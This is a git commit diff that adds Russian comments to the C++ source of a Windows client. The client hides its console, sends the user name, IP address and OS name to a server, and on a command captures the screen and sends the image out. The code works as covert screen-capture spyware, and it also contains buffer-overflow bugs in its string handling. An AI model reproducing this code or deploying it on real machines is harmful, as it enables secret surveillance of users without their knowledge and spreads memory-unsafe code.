227fe655a5f637f5e213e3da28bae37dfff3f6c1
Klimentiy Dudarev <101472727+Verius50@users.noreply.github.com>
2024-02-27 17:07:09 +0300

    Добавление комментариев

--- Client/Client.cpp
+++ Client/Client.cpp
@@ -11,12 +11,12 @@
 
 #pragma comment (lib, "ws2_32.lib")
 
-SOCKET connectSocket = INVALID_SOCKET;
-ADDRINFO* addrResult = NULL;
+SOCKET connectSocket = INVALID_SOCKET;    //сокет клиента
+ADDRINFO* addrResult = NULL;            //адрес сервера
 
 
 
-const char* getOsName()
+const char* getOsName()        //для получения данных об ОС клиента
 {
 #ifdef _WIN32
     return "Windows 32-bit";
@@ -33,7 +33,7 @@ const char* getOsName()
 #endif
 }
 
-void makeScreenShot()
+void makeScreenShot()        //создание скриншота
 {
     // Определение контекстов
     HDC ScreenDC = GetDC(0);
@@ -70,7 +70,7 @@ void makeScreenShot()
         ImageBuffer[i + 2] = ColorValue;
     }
 
-    char* screenInfo = new char[15];
+    char* screenInfo = new char[15];        // Передаём размеры экрана
 
     strcpy(screenInfo, std::to_string(ScreenWidth).c_str());
     strcat(screenInfo, " ");
@@ -79,18 +79,18 @@ void makeScreenShot()
     std::cout << "send";
     send(connectSocket, screenInfo, 15, 0);
 
-    send(connectSocket, (char*)ImageBuffer, 3 * ScreenHeight * ScreenWidth, 0);
+    send(connectSocket, (char*)ImageBuffer, 3 * ScreenHeight * ScreenWidth, 0);     // И сам скриншот
 
     DeleteObject(hBitmap);
 }
 
-BOOL CtrlHandler(DWORD fdwCtrlType)
+BOOL CtrlHandler(DWORD fdwCtrlType)        //событие закрытия консоли
 {
     switch (fdwCtrlType)
     {
 
     case CTRL_CLOSE_EVENT:
-        shutdown(connectSocket, SD_SEND);
+        shutdown(connectSocket, SD_SEND);        //отлючаем сокет
         freeaddrinfo(addrResult);
         WSACleanup();
         return TRUE;
@@ -100,7 +100,8 @@ BOOL CtrlHandler(DWORD fdwCtrlType)
 
 int main()
 {
-    FreeConsole();
+    FreeConsole();    // Скрываем консоль
+    //далее получаем имя пользователя в системе
     TCHAR wusername[UNLEN + 1];
     DWORD username_len = UNLEN + 1;
     GetUserName(wusername, &username_len);
@@ -108,7 +109,7 @@ int main()
     wcstombs(username, wusername, UNLEN + 1);
 
 
-    SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE);
+    SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE);    
 
     WSAData wsaData;
     ADDRINFO hints;
@@ -125,10 +126,10 @@ int main()
     hints.ai_protocol = IPPROTO_TCP;
     hints.ai_family = AF_INET;
 
-    result = getaddrinfo("localhost", "12", &hints, &addrResult);
+    result = getaddrinfo("localhost", "12", &hints, &addrResult);    //получаем адрес сервера
 
     struct sockaddr_in* psai = (struct sockaddr_in*)addrResult->ai_addr;
-    inet_ntop(addrResult->ai_family, &(psai->sin_addr), ip, INET_ADDRSTRLEN);
+    inet_ntop(addrResult->ai_family, &(psai->sin_addr), ip, INET_ADDRSTRLEN);    //созраняем наш ip для последубщей отправки
 
     connectSocket = socket(addrResult->ai_family, addrResult->ai_socktype, addrResult->ai_protocol);
 
@@ -139,7 +140,7 @@ int main()
         WSACleanup();
         return 1;
     }
-    result = connect(connectSocket, addrResult->ai_addr, int(addrResult->ai_addrlen));
+    result = connect(connectSocket, addrResult->ai_addr, int(addrResult->ai_addrlen));        //подключаемся к серверу
     if (result == SOCKET_ERROR)
     {
         std::cout << "connecting error " << result;
@@ -149,7 +150,7 @@ int main()
         return 1;
     }
 
-    char* data = new char[strlen(username) + strlen(ip) + strlen(getOsName())];
+    char* data = new char[strlen(username) + strlen(ip) + strlen(getOsName())];    // создаём и отправляем наши данные
     data = strcpy(data, username);
     data = strcat(data, "/");
     data = strcat(data, ip);
@@ -157,13 +158,13 @@ int main()
     data = strcat(data, getOsName());
     send(connectSocket, data, strlen(data), 0);
 
-    do {
+    do {      // Далее ждём указаний
         result = recv(connectSocket, data, strlen(data), 0);
-        if (result > 0) {
-            if (data[0] == 's')
-                makeScreenShot();
+        if (result > 0) {    //если они пришли
+            if (data[0] == 's')    //если нужно сделать скриншот
+                makeScreenShot();    //делаем и отправляем его
         }
-        if (result == 0)
+        if (result == 0)        //если сервера больше нет, завершаем программу
             std::cout << "Connection closed!" << '\n';
     } while (result > 0);
 
